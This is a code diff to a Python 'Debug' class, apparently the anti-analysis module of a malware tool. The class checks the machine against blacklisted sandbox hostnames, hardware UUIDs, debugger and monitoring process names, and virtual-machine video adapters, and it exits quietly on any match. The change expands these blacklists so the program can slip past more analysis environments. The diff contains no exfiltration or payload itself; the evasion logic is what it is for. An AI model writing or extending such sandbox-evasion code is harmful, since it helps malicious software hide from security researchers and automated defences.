@@ -17,7 +17,7 @@ class Debug:
 			'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez',
 			'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'nettypc', 'desktop-bugio', 'desktop-cbgpfee', 'server-pc', 'tiqiyla9tw5m',
 			'desktop-kalvino', 'compname_4047', 'desktop-19olltd', 'desktop-de369se', 'ea8c2e2a-d017-4', 'aidanpc', 'lucas-pc', 'marci-pc', 'acepc', 'mike-pc', 'desktop-iapkn1p',
-			'desktop-ntu7vuo', 'louise-pc', 't00917', 'test42'
+			'desktop-ntu7vuo', 'louise-pc', 't00917', 'test42', 'desktop-et51ajo'
 		}
 		self.blacklisted_uuids = {
 			'7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
@@ -85,7 +85,8 @@ class Debug:
 			"httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
 			"ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga",
 			"joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"}
-		self.video_controllers = ["virtualbox", "vmware", "qemu", "parallels", "microsoft basic display adapter", "microsoft hyper-v-video", "microsoft remote display adapter"]
+		self.blacklisted_video_controllers = ["virtualbox", "vmware", "qemu", "parallels", "microsoft basic display adapter","microsoft hyper-v-video",
+							"microsoft remote display adapter", "onrf_d", "pcwmg1n_e", "y9696y"]
 
 		if self.checks():
 			sys.exit(0)
@@ -135,7 +136,7 @@ class Debug:
 	def checkVideoController(self) -> bool:
 		with subprocess.Popen("wmic path win32_VideoController get name", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as p:
 			video_controller = p.stdout.read().decode('utf-8').lower()
-		r1 = any(controller in video_controller for controller in self.video_controllers)
+		r1 = any(controller in video_controller for controller in self.blacklisted_video_controllers)
 		r2 = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
 		return r1 or r2
 
